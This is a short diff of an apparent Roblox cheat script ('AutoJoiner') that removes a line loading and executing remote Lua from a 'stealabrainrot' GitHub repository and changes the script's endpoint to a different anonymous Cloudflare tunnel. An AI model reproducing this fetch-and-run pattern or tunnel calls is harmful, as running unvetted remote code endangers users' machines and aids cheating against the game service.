@@ -1,9 +1,8 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rexzysab/stealabrainrot/refs/heads/main/Chilli.lua"))()
 
 (function()
     repeat task.wait() until game:IsLoaded()
     local HttpService = game:GetService("HttpService")
-    local EndpointURL =  "https://structures-hist-foreign-adaptation.trycloudflare.com/"
+    local EndpointURL =  "https://curve-disciplinary-drums-saints.trycloudflare.com/"
 
     local function prints(str)
         print("[AutoJoiner]: " .. str)
